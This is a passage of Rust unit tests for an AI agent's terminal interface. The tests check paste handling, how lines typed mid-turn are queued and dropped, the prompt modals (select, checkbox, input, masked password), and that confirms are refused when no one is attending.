            .handle_input(TermInput::Paste("pasted-p3x".to_string()));
        assert_eq!(harness.app.composer_text(), "draft");
        assert_eq!(harness.app.prompts.len(), 1);
        harness.clock.advance(HOTKEY_IDLE);
        harness.press(KeyCode::Esc);
        assert_eq!(asker.join().unwrap().unwrap(), PromptAnswer::Cancelled);
    }

    /// A paste keeps its line breaks whichever line end the terminal
    /// used: CR, CRLF and LF all split the composer the same way.
    #[test]
    fn a_paste_with_carriage_returns_lands_line_by_line() {
        let mut harness = Harness::standalone(80, 24);
        harness
            .app
            .handle_input(TermInput::Paste("a\rb\r\nc\nd".to_string()));
        assert_eq!(harness.app.composer.lines(), ["a", "b", "c", "d"]);
        assert!(
            !harness.app.composer_text().contains('\r'),
            "{:?}",
            harness.app.composer_text()
        );
    }

    /// Enter tapped on an empty composer while the turn runs holds
    /// nothing, but it is still a keystroke for the idle gate: a confirm
    /// appearing right after one is not answered by the next tap of the
    /// same key.
    #[test]
    fn enter_ignored_during_a_turn_still_arms_the_idle_gate_for_a_fresh_confirm() {
        let mut harness = Harness::standalone(80, 24);
        harness.type_text("call the tool");
        harness.clock.advance(HOTKEY_IDLE);
        assert!(matches!(
            harness.press(KeyCode::Enter),
            Some(Command::Submit(_))
        ));
        harness.app.begin_turn("call the tool", false);
        harness.clock.advance(HOTKEY_IDLE);
        assert_eq!(harness.press(KeyCode::Enter), None);

        harness.clock.advance(Duration::from_millis(200));
        let asker = ask_on_a_thread(&mut harness, confirm_request(None));
        assert_eq!(harness.press(KeyCode::Enter), None);
        assert_eq!(harness.app.prompts.len(), 1);
        assert!(!asker.is_finished());

        harness.clock.advance(HOTKEY_IDLE);
        assert_eq!(harness.press(KeyCode::Enter), None);
        assert_eq!(
            asker.join().unwrap().unwrap(),
            PromptAnswer::Confirmed(true)
        );
    }

    /// A prompt entered during a turn is held and handed to the loop,
    /// whose step puts it on the turn's queue and announces it; a command
    /// is only held. Alt+Up takes the newest back, newest first.
    #[test]
    #[serial]
    fn lines_entered_during_a_turn_are_queued_and_prompts_reach_the_model() {
        let sink = crate::events::RecordingSink::install();
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("explain", false);
        harness.type_text("hello q9d-q");
        assert_eq!(
            harness.press(KeyCode::Enter),
            Some(Command::Queue("hello q9d-q".to_string()))
        );
        assert_eq!(harness.app.composer_text(), "");
        let frame = harness.draw();
        assert!(frame.contains("pending: 1"), "{frame}");
        assert!(frame.contains("hello q9d-q"), "{frame}");

        let queue = NotificationQueue::new();
        queued::queue_user_message(&queue, "hello q9d-q");
        assert_eq!(
            sink.drain(),
            vec![Event::QueuedInput {
                text: "hello q9d-q".to_string()
            }]
        );
        let drained = queue.drain();
        assert_eq!(drained.len(), 1);
        assert!(matches!(
            &drained[0],
            crate::supervisor::notification::SystemNotification::UserMessage { text }
                if text == "hello q9d-q"
        ));

        harness.type_text(".info");
        assert_eq!(harness.press(KeyCode::Enter), None);
        assert_eq!(
            harness.app.queued,
            vec![
                QueuedLine {
                    text: "hello q9d-q".to_string(),
                    command: false
                },
                QueuedLine {
                    text: ".info".to_string(),
                    command: true
                },
            ]
        );
        assert!(sink.drain().is_empty());
        let frame = harness.draw();
        assert!(frame.contains("pending: 2"), "{frame}");

        let alt_up = KeyEvent::new(KeyCode::Up, KeyModifiers::ALT);
        assert_eq!(harness.app.handle_key(alt_up), None);
        assert_eq!(harness.app.composer_text(), ".info");
        // The second Alt+Up finds `.info` as the draft and holds it again.
        assert_eq!(
            harness.app.handle_key(alt_up),
            Some(Command::Unqueue {
                held: Some("hello q9d-q".to_string()),
                draft: None,
            })
        );
        assert_eq!(harness.app.composer_text(), "hello q9d-q");
        assert_eq!(
            harness.app.queued,
            vec![QueuedLine {
                text: ".info".to_string(),
                command: true
            }]
        );
        assert!(harness.draw().contains("pending: 1"));
    }

    /// Alt+Up over a draft trades places with it: the held line comes
    /// out, the draft goes to the end of the queue, and the loop is told
    /// to withdraw the one and offer the other.
    #[test]
    fn editing_a_queued_line_keeps_the_draft_on_the_queue() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("explain", false);
        harness.type_text("a");
        assert_eq!(
            harness.press(KeyCode::Enter),
            Some(Command::Queue("a".to_string()))
        );
        harness.type_text("d");
        let alt_up = KeyEvent::new(KeyCode::Up, KeyModifiers::ALT);
        assert_eq!(
            harness.app.handle_key(alt_up),
            Some(Command::Unqueue {
                held: Some("a".to_string()),
                draft: Some("d".to_string()),
            })
        );
        assert_eq!(harness.app.composer_text(), "a");
        assert_eq!(
            harness.app.queued,
            vec![QueuedLine {
                text: "d".to_string(),
                command: false
            }]
        );
    }

    /// The strip follows the model: a line it was handed leaves the queue
    /// the moment the cell is committed, so the count is right and Alt+Up
    /// cannot pull a sent line back into the composer.
    #[test]
    fn a_line_sent_mid_turn_leaves_the_queue_at_once() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("explain", false);
        for text in ["a", "b"] {
            harness.type_text(text);
            assert_eq!(
                harness.press(KeyCode::Enter),
                Some(Command::Queue(text.to_string()))
            );
        }
        assert!(harness.draw().contains("pending: 2"));
        harness
            .app
            .handle_msg(UiMsg::QueuedInputSent("a".to_string()));
        assert_eq!(
            harness.app.queued,
            vec![QueuedLine {
                text: "b".to_string(),
                command: false
            }]
        );
        let frame = harness.draw();
        assert!(frame.contains("pending: 1"), "{frame}");
        assert!(frame.contains("> a (sent mid-turn)"), "{frame}");
        let alt_up = KeyEvent::new(KeyCode::Up, KeyModifiers::ALT);
        assert_eq!(
            harness.app.handle_key(alt_up),
            Some(Command::Unqueue {
                held: Some("b".to_string()),
                draft: None,
            })
        );
        assert_eq!(harness.app.composer_text(), "b");
        assert!(harness.app.queued.is_empty());
    }

    /// The moment the model is handed a queued line, the transcript gets
    /// a cell for it where it was read, scrubbed like a typed line.
    #[test]
    fn a_line_sent_mid_turn_is_committed_as_a_scrubbed_cell() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("explain", false);
        harness
            .app
            .handle_msg(UiMsg::QueuedInputSent("\x1b[31mred\x1b[0m".to_string()));
        assert!(matches!(
            harness.app.transcript.cells(),
            [
                Cell::User {
                    mid_turn: false,
                    ..
                },
                Cell::User {
                    text,
                    mid_turn: true,
                    opened: false,
                    ..
                }
            ] if text == "red"
        ));
    }

    /// A user line, a reply, the line sent mid-turn, the next reply. The
    /// mid-turn cell carries its marker in the text itself and is drawn
    /// dim, so it reads as sent-by-the-queue with or without colour.
    fn mid_turn_transcript(harness: &mut Harness) -> String {
        harness.app.begin_turn("explain", false);
        harness
            .app
            .handle_msg(UiMsg::AssistantText("first reply".to_string()));
        harness
            .app
            .handle_msg(UiMsg::QueuedInputSent("follow-up k4e-m".to_string()));
        harness
            .app
            .handle_msg(UiMsg::AssistantText("second reply".to_string()));
        harness.app.end_turn(false, &TurnOutcome::default());
        harness.draw()
    }

    #[test]
    fn the_mid_turn_cell_is_dim_with_a_marker() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.set_no_color(false);
        let frame = mid_turn_transcript(&mut harness);
        insta::assert_snapshot!("mid_turn_cell_80x24", &frame);
        let row = screen_row(&harness, "> follow-up k4e-m (sent mid-turn)");
        let buffer = harness.terminal.backend().buffer();
        assert!(buffer[(0, row)].modifier.contains(Modifier::DIM), "{frame}");
        assert!(
            !buffer[(0, row)].modifier.contains(Modifier::BOLD),
            "{frame}"
        );
        let typed = screen_row(&harness, "> explain");
        assert!(
            buffer[(0, typed)].modifier.contains(Modifier::BOLD),
            "{frame}"
        );
        assert!(
            !buffer[(0, typed)].modifier.contains(Modifier::DIM),
            "{frame}"
        );
        let placeholder = &buffer[(1, COMPOSER_TEXT_ROW)];
        assert_eq!(placeholder.symbol(), "T", "{frame}");
        assert!(placeholder.modifier.contains(Modifier::DIM), "{frame}");
        assert_eq!(placeholder.bg, Color::Indexed(236), "{frame}");
    }

    #[test]
    fn the_mid_turn_marker_survives_no_color() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.set_no_color(true);
        let frame = mid_turn_transcript(&mut harness);
        insta::assert_snapshot!("mid_turn_cell_nocolor_80x24", &frame);
        assert!(frame.contains("(sent mid-turn)"), "{frame}");
        let row = screen_row(&harness, "> follow-up k4e-m (sent mid-turn)");
        let buffer = harness.terminal.backend().buffer();
        assert!(buffer[(0, row)].modifier.contains(Modifier::DIM), "{frame}");
        let placeholder = &buffer[(1, COMPOSER_TEXT_ROW)];
        assert_eq!(placeholder.symbol(), "T", "{frame}");
        assert!(placeholder.modifier.contains(Modifier::DIM), "{frame}");
        assert_eq!(placeholder.bg, Color::Reset, "{frame}");
    }

    /// Esc during a turn drops what was lined up behind it and says so.
    /// The second held line went in through the palette, which the queue
    /// closes: the Esc that follows reaches the turn, not a band.
    #[test]
    fn an_interrupt_drops_the_queued_lines_with_a_notice() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("explain", false);
        harness.type_text("later");
        harness.press(KeyCode::Enter);
        harness.type_text(".info");
        assert!(palette(&harness).is_some());
        assert_eq!(harness.press(KeyCode::Enter), None);
        assert_eq!(harness.app.queued.len(), 2);
        assert!(harness.app.composer.is_empty());
        assert!(palette(&harness).is_none());
        assert_eq!(harness.app.vi_mode, None);
        assert_eq!(harness.press(KeyCode::Esc), Some(Command::Interrupt));
        assert!(harness.app.queued.is_empty());
        let frame = harness.draw();
        assert!(frame.contains("Dropped 2 queued line(s)"), "{frame}");
        assert!(!frame.contains("pending:"), "{frame}");
    }

    /// Ctrl+D during a turn quits, and what was lined up behind the turn
    /// goes the same way as on an interrupt, with the same notice.
    #[test]
    fn a_quit_drops_the_queued_lines_with_a_notice() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("explain", false);
        harness.type_text("later");
        harness.press(KeyCode::Enter);
        assert_eq!(harness.app.queued.len(), 1);
        let quit = harness
            .app
            .handle_key(KeyEvent::new(KeyCode::Char('d'), KeyModifiers::CONTROL));
        assert_eq!(quit, Some(Command::Quit));
        assert!(harness.app.queued.is_empty());
        let frame = harness.draw();
        assert!(frame.contains("Dropped 1 queued line(s)"), "{frame}");
    }

    /// The loop's half of the drop: the user's lines come off the queue
    /// the running turn reads, a task's notification stays for the exit
    /// work, and no task at all is nothing to purge.
    #[tokio::test]
    async fn purging_the_turn_queue_takes_only_the_users_lines() {
        let queue = Arc::new(NotificationQueue::new());
        queued::queue_user_message(&queue, "later");
        queue.push(crate::supervisor::notification::job_notification(
            "job-1", "tool", true,
        ));
        let task = Some(Task::Turn {
            handle: tokio::spawn(std::future::pending()),
            command: false,
            queue: Arc::clone(&queue),
        });
        purge_turn_queue(&task);
        purge_turn_queue(&None);
        let left = queue.drain();
        assert_eq!(left.len(), 1);
        assert_eq!(left[0].id(), Some("job-1"));
    }

    /// A line queued after the interrupt, before the turn actually ends,
    /// survives the reconcile even when the dropped one is still on the
    /// queue the turn hands back.
    #[test]
    fn a_line_queued_after_an_interrupt_survives_the_reconcile() {
        let mut harness = Harness::standalone(80, 24);
        let queue = NotificationQueue::new();
        harness.app.begin_turn("explain", false);
        harness.type_text("a");
        assert_eq!(
            harness.press(KeyCode::Enter),
            Some(Command::Queue("a".to_string()))
        );
        queued::queue_user_message(&queue, "a");
        assert_eq!(harness.press(KeyCode::Esc), Some(Command::Interrupt));
        assert!(harness.app.queued.is_empty());
        harness.type_text("b");
        assert_eq!(
            harness.press(KeyCode::Enter),
            Some(Command::Queue("b".to_string()))
        );
        queued::queue_user_message(&queue, "b");

        reconcile_queue(&mut harness.app.queued, &take_user_messages(&queue));
        let texts: Vec<&str> = harness.app.queued.iter().map(|l| l.text.as_str()).collect();
        assert_eq!(texts, ["b"]);
    }

    /// The lines left over at the end of a turn go on the queue of the
    /// context that came back, the one the next turn clones. A `.agent`
    /// turn hands back a context with a fresh queue, and what the end of
    /// the turn put on the old one would never be taken again.
    #[test]
    fn leftover_lines_are_carried_on_the_returned_contexts_queue() {
        let mut harness = Harness::standalone(80, 24);
        let mut ctx = chat_ctx();
        let finished = Arc::clone(&ctx.notification_queue);
        harness.app.begin_turn(".agent helper", true);
        harness.type_text("first q9d-a");
        harness.press(KeyCode::Enter);
        harness.type_text("second q9d-b");
        harness.press(KeyCode::Enter);
        carry_over(&finished, &harness.app.queued);
        ctx.notification_queue = Arc::new(NotificationQueue::new());
        harness.app.end_turn(true, &TurnOutcome::default());

        reconcile_queue(&mut harness.app.queued, &take_user_messages(&finished));
        assert_eq!(harness.app.queued.len(), 2);
        let next = harness.app.queued.remove(0);
        assert_eq!(next.text, "first q9d-a");
        carry_over(&ctx.notification_queue, &harness.app.queued);
        assert_eq!(
            take_user_messages(&ctx.notification_queue),
            ["second q9d-b"]
        );
        assert!(take_user_messages(&finished).is_empty());
    }

    #[test]
    fn yes_for_this_session_answers_and_is_remembered_for_the_tool() {
        let mut harness = Harness::standalone(80, 24);
        let req = confirm_request(Some("fs_write"));
        assert_eq!(harness.app.prompt_memory.auto_answer(&req), None);
        let asker = ask_on_a_thread(&mut harness, req.clone());
        assert!(harness.draw().contains("tool: fs_write"));
        harness.clock.advance(HOTKEY_IDLE);
        assert_eq!(harness.press(KeyCode::Char('a')), None);
        assert_eq!(
            asker.join().unwrap().unwrap(),
            PromptAnswer::Confirmed(true)
        );
        assert_eq!(harness.app.prompt_memory.auto_answer(&req), Some(true));
    }

    /// Enter on the field settles from the modal's appearance: the
    /// answer is typed, so typing must not push the send out. Enter a
    /// millisecond short of the second is dropped, more typing right
    /// after does not re-arm it, and Enter at the second sends.
    #[test]
    fn an_input_modal_types_into_its_own_field_and_sends_it() {
        let mut harness = Harness::standalone(80, 24);
        harness.type_text("draft");
        let req = PromptRequest::new(PromptAction::Input, "Session name:", Origin::detached());
        let asker = ask_on_a_thread(&mut harness, req);
        harness.type_text("notes");
        let frame = harness.draw();
        assert_welcome_snapshot("input_modal_80x24", &frame);
        assert_eq!(harness.press(KeyCode::Enter), None);
        assert!(!asker.is_finished());
        harness
            .clock
            .advance(HOTKEY_IDLE - Duration::from_millis(1));
        assert_eq!(harness.press(KeyCode::Enter), None);
        assert!(!asker.is_finished());
        harness.type_text(" two");
        harness.clock.advance(Duration::from_millis(1));
        assert_eq!(harness.press(KeyCode::Enter), None);
        assert_eq!(
            asker.join().unwrap().unwrap(),
            PromptAnswer::Text("notes two".to_string())
        );
        assert_eq!(harness.app.composer_text(), "draft");
    }

    fn list_request(action: PromptAction, tool: Option<&str>) -> PromptRequest {
        PromptRequest {
            options: ["alpha", "beta", "gamma"].map(str::to_string).to_vec(),
            tool: tool.map(str::to_string),
            ..PromptRequest::new(action, "Pick one q9d-s", Origin::detached())
        }
    }

    /// A select lists its options under the question with the custom row
    /// last; the arrows move the marker without the gate and Enter, once
    /// idle, sends the marked option's text.
    #[test]
    fn a_select_modal_moves_its_marker_and_sends_the_row() {
        let mut harness = Harness::standalone(80, 24);
        let asker = ask_on_a_thread(
            &mut harness,
            list_request(PromptAction::Select, Some("ask")),
        );
        assert_eq!(harness.press(KeyCode::Down), None);
        let frame = harness.draw();
        assert_welcome_snapshot("select_modal_80x24", &frame);
        assert!(frame.contains("tool: ask"), "{frame}");
        assert!(frame.contains(CUSTOM_CHOICE_ROW), "{frame}");
        assert_eq!(harness.press(KeyCode::Enter), None);
        assert!(!asker.is_finished());
        harness.clock.advance(HOTKEY_IDLE);
        assert_eq!(harness.press(KeyCode::Enter), None);
        assert_eq!(
            asker.join().unwrap().unwrap(),
            PromptAnswer::Selected("beta".to_string())
        );
        assert!(harness.app.prompts.is_empty());
    }

    /// A digit chooses the select's row outright; one past the options
    /// does nothing, so a stray key cannot answer with the custom row.
    #[test]
    fn a_select_digit_chooses_the_row_outright() {
        let mut harness = Harness::standalone(80, 24);
        let asker = ask_on_a_thread(&mut harness, list_request(PromptAction::Select, None));
        harness.clock.advance(HOTKEY_IDLE);
        assert_eq!(harness.press(KeyCode::Char('4')), None);
        assert!(!asker.is_finished());
        assert_eq!(harness.press(KeyCode::Char('3')), None);
        assert_eq!(
            asker.join().unwrap().unwrap(),
            PromptAnswer::Selected("gamma".to_string())
        );
    }

    /// Enter on the custom row swaps the list for a text field, and the
    /// field opens with a fresh gate: the Enter that typed the text
    /// cannot send it until the gap passes. What is sent is a selection,
    /// so the asker reads it like any other row.
    #[test]
    fn the_custom_row_of_a_select_opens_a_field_whose_text_is_the_selection() {
        let mut harness = Harness::standalone(80, 24);
        let asker = ask_on_a_thread(&mut harness, list_request(PromptAction::Select, None));
        harness.clock.advance(HOTKEY_IDLE);
        assert_eq!(harness.press(KeyCode::Char('k')), None);
        for _ in 0..5 {
            assert_eq!(harness.press(KeyCode::Down), None);
        }
        assert_eq!(harness.press(KeyCode::Enter), None);
        assert_eq!(
            harness.app.key_context().modal,
            Some(ModalKind::Select {
                custom_field_open: true
            })
        );
        harness.type_text("delta");
        let frame = harness.draw();
        assert_welcome_snapshot("select_custom_field_80x24", &frame);
        assert_eq!(harness.press(KeyCode::Enter), None);
        assert!(!asker.is_finished());
        harness.clock.advance(HOTKEY_IDLE);
        assert_eq!(harness.press(KeyCode::Enter), None);
        assert_eq!(
            asker.join().unwrap().unwrap(),
            PromptAnswer::Selected("delta".to_string())
        );
    }

    /// A checkbox ticks rows with Space and Enter sends the ticked
    /// options in the list's order.
    #[test]
    fn a_checkbox_modal_ticks_rows_and_sends_them_in_order() {
        let mut harness = Harness::standalone(80, 24);
        let asker = ask_on_a_thread(&mut harness, list_request(PromptAction::Checkbox, None));
        assert_eq!(harness.press(KeyCode::Down), None);
        assert_eq!(harness.press(KeyCode::Down), None);
        harness.clock.advance(HOTKEY_IDLE);
        assert_eq!(harness.press(KeyCode::Char(' ')), None);
        assert_eq!(harness.press(KeyCode::Up), None);
        assert_eq!(harness.press(KeyCode::Up), None);
        harness.clock.advance(HOTKEY_IDLE);
        assert_eq!(harness.press(KeyCode::Char(' ')), None);
        let frame = harness.draw();
        assert_welcome_snapshot("checkbox_modal_80x24", &frame);
        assert!(frame.contains("[x] alpha"), "{frame}");
        assert!(frame.contains("[ ] beta"), "{frame}");
        assert!(!frame.contains(CUSTOM_CHOICE_ROW), "{frame}");
        harness.clock.advance(HOTKEY_IDLE);
        assert_eq!(harness.press(KeyCode::Enter), None);
        assert_eq!(
            asker.join().unwrap().unwrap(),
            PromptAnswer::Checked(["alpha", "gamma"].map(str::to_string).to_vec())
        );
    }

    /// A password's field shows a mask per character and sends the text
    /// behind it.
    #[test]
    fn a_password_modal_masks_its_field() {
        let mut harness = Harness::standalone(80, 24);
        let req = PromptRequest::new(PromptAction::Password, "Token:", Origin::detached());
        let asker = ask_on_a_thread(&mut harness, req);
        harness.type_text("hunter2");
        let frame = harness.draw();
        assert_welcome_snapshot("password_modal_80x24", &frame);
        assert!(!frame.contains("hunter2"), "{frame}");
        assert!(frame.contains("*******"), "{frame}");
        harness.clock.advance(HOTKEY_IDLE);
        assert_eq!(harness.press(KeyCode::Enter), None);
        assert_eq!(
            asker.join().unwrap().unwrap(),
            PromptAnswer::Text("hunter2".to_string())
        );
    }

    /// A list taller than the rows it gets scrolls to keep the marker in
    /// view; the question keeps at least its one row.
    #[test]
    fn a_long_select_windows_its_rows_around_the_marker() {
        let mut harness = Harness::standalone(60, 14);
        let req = PromptRequest {
            options: (1..=20).map(|n| format!("option {n:02}")).collect(),
            ..PromptRequest::new(PromptAction::Select, "Pick one q9d-s", Origin::detached())
        };
        let _asker = ask_on_a_thread(&mut harness, req);
        let top = harness.draw();
        assert!(top.contains("> option 01"), "{top}");
        assert!(!top.contains("option 20"), "{top}");
        for _ in 0..19 {
            assert_eq!(harness.press(KeyCode::Down), None);
        }
        let bottom = harness.draw();
        assert!(bottom.contains("> option 20"), "{bottom}");
        assert!(!bottom.contains("option 01"), "{bottom}");
        assert!(bottom.contains("Pick one q9d-s"), "{bottom}");
    }

    /// A question whose asker ends is taken down with a cancel: the tool
    /// call, job or agent that asked is matched by its id, an empty id
    /// matches nothing, a queued question goes the same way as the front,
    /// and the front's successor gets a fresh gate.
    #[test]
    fn a_prompt_is_cancelled_when_its_asker_ends() {
        fn asked_by(call_id: Option<&str>, job_id: Option<&str>) -> PromptRequest {
            PromptRequest {
                call_id: call_id.map(str::to_string),
                job_id: job_id.map(str::to_string),
                ..list_request(PromptAction::Select, None)
            }
        }
        fn asked_by_agent(agent_id: &str) -> PromptRequest {
            let mut req = asked_by(None, None);
            req.origin.agent_id = Some(agent_id.to_string());
            req
        }
        fn tool_finished(call_id: &str) -> UiMsg {
            UiMsg::ToolFinished {
                call_id: call_id.to_string(),
                ok: true,
                error: None,
                duration_ms: None,
            }
        }
        fn job_finished(job_id: &str) -> UiMsg {
            UiMsg::JobFinished {
                job_id: job_id.to_string(),
                ok: false,
                error: Some("boom".to_string()),
            }
        }
        fn job_cancelled(job_id: &str) -> UiMsg {
            UiMsg::JobCancelled {
                job_id: job_id.to_string(),
            }
        }
        fn agent_finished(agent_id: &str) -> UiMsg {
            UiMsg::AgentFinished {
                agent_id: agent_id.to_string(),
                outcome: AgentOutcome::Interrupted,
            }
        }
        let cases = [
            (
                asked_by(Some("call-1"), None),
                tool_finished("call-1"),
                true,
            ),
            (
                asked_by(Some("call-1"), None),
                tool_finished("call-2"),
                false,
            ),
            (
                asked_by(Some("call-1"), None),
                job_finished("call-1"),
                false,
            ),
            (asked_by(None, Some("job-1")), job_finished("job-1"), true),
            (asked_by(None, Some("job-1")), job_cancelled("job-1"), true),
            (asked_by(None, Some("job-1")), job_finished("job-2"), false),
            (asked_by(None, Some("job-1")), tool_finished("job-1"), false),
            (asked_by_agent("agent-1"), agent_finished("agent-1"), true),
            (asked_by_agent("agent-1"), agent_finished("agent-2"), false),
            (
                asked_by(None, Some("job-1")),
                agent_finished("job-1"),
                false,
            ),
            (asked_by(None, None), tool_finished(""), false),
            (asked_by(None, None), job_finished(""), false),
            (asked_by(None, None), agent_finished(""), false),
        ];
        for (req, msg, dismissed) in cases {
            let mut harness = Harness::standalone(80, 24);
            let label = format!(
                "{:?}/{:?}/{:?} on {msg:?}",
                req.call_id, req.job_id, req.origin.agent_id
            );
            let asker = ask_on_a_thread(&mut harness, req);
            harness.app.handle_msg(msg);
            assert_eq!(harness.app.prompts.is_empty(), dismissed, "{label}");
            if dismissed {
                assert_eq!(
                    asker.join().unwrap().unwrap(),
                    PromptAnswer::Cancelled,
                    "{label}"
                );
            } else {
                assert!(!asker.is_finished(), "{label}");
                harness.app.abandon_prompts();
            }
        }

        let mut harness = Harness::standalone(80, 24);
        let front = ask_on_a_thread(&mut harness, asked_by(Some("call-1"), None));
        let queued = ask_on_a_thread(&mut harness, asked_by(None, Some("job-1")));
        let third = ask_on_a_thread(&mut harness, asked_by(None, Some("job-2")));
        harness.app.handle_msg(job_finished("job-2"));
        assert_eq!(harness.app.prompts.len(), 2);
        assert_eq!(third.join().unwrap().unwrap(), PromptAnswer::Cancelled);
        assert!(!front.is_finished());
        harness.clock.advance(HOTKEY_IDLE);
        harness.app.handle_msg(tool_finished("call-1"));
        assert_eq!(front.join().unwrap().unwrap(), PromptAnswer::Cancelled);
        assert_eq!(harness.app.prompts.len(), 1);
        assert_eq!(harness.press(KeyCode::Enter), None);
        assert!(!queued.is_finished());
        harness.clock.advance(HOTKEY_IDLE);
        assert_eq!(harness.press(KeyCode::Enter), None);
        assert_eq!(
            queued.join().unwrap().unwrap(),
            PromptAnswer::Selected("alpha".to_string())
        );
    }

    /// With nobody left to answer, every yes/no question is refused
    /// whatever default the asker supplied, coyote's own included, and
    /// anything else is cancelled, whether the prompter is already marked
    /// unattended or the question was queued when the UI gave up.
    #[test]
    fn unattended_prompts_refuse_every_confirm_and_cancel_the_rest() {
        let (tx, _rx) = unbounded_channel();
        let prompter = TuiPrompter::new(tx, Arc::new(AtomicBool::new(true)));
        let save = PromptRequest {
            default: Some(serde_json::json!(false)),
            ..confirm_request(None)
        };
        assert_eq!(
            prompter.prompt(save).unwrap(),
            PromptAnswer::Confirmed(false)
        );
        let opt_in = PromptRequest {
            default: Some(serde_json::json!(true)),
            ..confirm_request(None)
        };
        assert_eq!(
            prompter.prompt(opt_in).unwrap(),
            PromptAnswer::Confirmed(false)
        );
        assert_eq!(
            prompter.prompt(confirm_request(Some("fs_write"))).unwrap(),
            PromptAnswer::Confirmed(false)
        );
        let tool_opt_in = PromptRequest {
            default: Some(serde_json::json!(true)),
            ..confirm_request(Some("fs_write"))
        };
        assert_eq!(
            prompter.prompt(tool_opt_in).unwrap(),
            PromptAnswer::Confirmed(false)
        );
        let input = PromptRequest::new(PromptAction::Input, "Name:", Origin::detached());
        assert_eq!(prompter.prompt(input).unwrap(), PromptAnswer::Cancelled);

        let mut harness = Harness::standalone(80, 24);
        let asker = ask_on_a_thread(&mut harness, confirm_request(None));
        harness.app.abandon_prompts();
        assert_eq!(
            asker.join().unwrap().unwrap(),
            PromptAnswer::Confirmed(false)
        );
    }

    /// Once the UI has given up, a question already in the inbox and one
    /// raised while the work task is still being waited for are both
    /// answered unattended; the asker never sits on the reply until the
    /// deadline. The second question is only asked once the first has
    /// its answer, which the drain gives it, so it has to reach the wait.
    #[tokio::test]
    async fn prompts_raised_after_the_ui_gave_up_are_answered_unattended() {
        let (tx, mut rx) = unbounded_channel();
        let prompter = Arc::new(TuiPrompter::new(tx, Arc::new(AtomicBool::new(false))));

        let queued = Arc::clone(&prompter);
        let early = std::thread::spawn(move || queued.prompt(confirm_request(None)));
        while rx.is_empty() {
            tokio::time::sleep(Duration::from_millis(5)).await;
        }
        let late = Arc::clone(&prompter);
        let handle = tokio::task::spawn_blocking(move || {
            let early_answer = early.join().unwrap();
            let answer = late.prompt(PromptRequest {
                default: Some(serde_json::json!(true)),
                ..confirm_request(None)
            });
            (answer, early_answer)
        });
        let started = Instant::now();
        let (Join::Finished((late_answer, early_answer)), _) =
            join_unattended(handle, &mut rx, EXIT_CANCEL_WAIT).await
        else {
            panic!("the work task finished well inside the deadline");
        };
        assert!(started.elapsed() < EXIT_CANCEL_WAIT);
        assert_eq!(early_answer.unwrap(), PromptAnswer::Confirmed(false));
        assert_eq!(late_answer.unwrap(), PromptAnswer::Confirmed(false));
    }

    /// Esc ends a turn by latching ctrl-c on the shared signal and nothing
    /// clears it afterwards; a quit from the idle composer must not inherit
    /// it, or the exit work would report a deliberate quit as interrupted
    /// (no `agent.completed`). A quit during a turn is the interruption.
    #[test]
    fn an_idle_quit_after_an_interrupted_turn_starts_the_exit_with_a_clean_signal() {
        let abort = create_abort_signal();
        // Esc during a turn, the turn ends, the user quits idle.
        abort.set_ctrlc();
        assert!(abort.aborted_ctrlc());
        quit_abort(&abort, false);
        assert!(
            !abort.aborted_ctrlc(),
            "the idle quit carried the earlier interrupt into the exit"
        );
        assert!(!abort.aborted());
    }

    #[test]
    fn a_quit_during_a_turn_interrupts_it() {
        let abort = create_abort_signal();
        quit_abort(&abort, true);
        assert!(abort.aborted_ctrlc());
    }

    /// A work task that never finishes is given up on at the deadline:
    /// the wait reports a timeout rather than following the task. The
    /// caller then has a task still running and no context, which is the
    /// case `run` ends the process for.
    #[tokio::test(start_paused = true)]
    async fn join_unattended_gives_up_at_the_deadline() {
        let (_tx, mut rx) = unbounded_channel();
        let handle = tokio::spawn(std::future::pending::<()>());
        let deadline = Duration::from_millis(50);
        let started = tokio::time::Instant::now();
        assert!(matches!(
            join_unattended(handle, &mut rx, deadline).await,
            (Join::TimedOut, _)
        ));
        assert!(started.elapsed() >= deadline);
    }

    /// A work task that panics while the UI waits on it is told apart
    /// from one that ran out of time: the panic comes back as such, with
    /// its message, instead of being reported as a task left behind.
    #[tokio::test]
    async fn join_unattended_reports_a_panicking_task_as_panicked() {
        let (_tx, mut rx) = unbounded_channel();
        let handle = tokio::task::spawn_blocking(|| -> () { panic!("boom-j4p") });
        let (Join::Panicked(err), _) = join_unattended(handle, &mut rx, EXIT_CANCEL_WAIT).await
        else {
            panic!("the panic was not reported as one");
        };
        assert!(err.is_panic(), "{err}");
        let payload = err.into_panic();
        assert_eq!(payload.downcast_ref::<&str>(), Some(&"boom-j4p"));
    }

    /// A notice sent right before the task ends (the shape of a panic's
    /// message through the capture) comes back with the outcome: the
    /// channel is read ahead of the task, so nothing lands between the
    /// two is lost, and a prompt raised meanwhile is still answered.
    #[tokio::test]
    async fn join_unattended_keeps_the_notices_that_arrive_during_the_wait() {
        let (tx, mut rx) = unbounded_channel();
        let early = late_output(tx.clone());
        early("already queued n1j".to_string());
        let handle = tokio::task::spawn_blocking(move || {
            let notice = late_output(tx);
            notice("thread 'main' panicked at exit n2j".to_string());
            panic!("boom-n3j")
        });
        let (joined, late) = join_unattended(handle, &mut rx, EXIT_CANCEL_WAIT).await;
        assert!(matches!(joined, Join::Panicked(_)));
        assert_eq!(
            late,
            ["already queued n1j", "thread 'main' panicked at exit n2j"]
        );
    }

    /// A supervised agent that never finishes. The exit work waits
    /// `EXIT_CANCEL_WAIT` on it before it saves the session.
    fn register_stuck_agent(ctx: &mut RequestContext) {
        use crate::supervisor::{AgentHandle, AgentResult, Supervisor};
        let join_handle = tokio::spawn(std::future::pending::<Result<AgentResult>>());
        let supervisor = Arc::new(parking_lot::RwLock::new(Supervisor::new(4, 3)));
        supervisor
            .write()
            .register(AgentHandle {
                id: "stuck-e6w".to_string(),
                agent_name: "explore".to_string(),
                depth: 1,
                inbox: Arc::new(crate::supervisor::mailbox::Inbox::new()),
                abort_signal: create_abort_signal(),
                join_handle,
                child_supervisor: None,
                session_id: None,
            })
            .unwrap();
        ctx.supervisor = Some(supervisor);
    }

    /// A background agent that ignores cancellation costs the exit its
    /// `EXIT_CANCEL_WAIT`, not the session save: the wait on the exit
    /// work outlasts the wait inside it, so `exit_session` still runs and
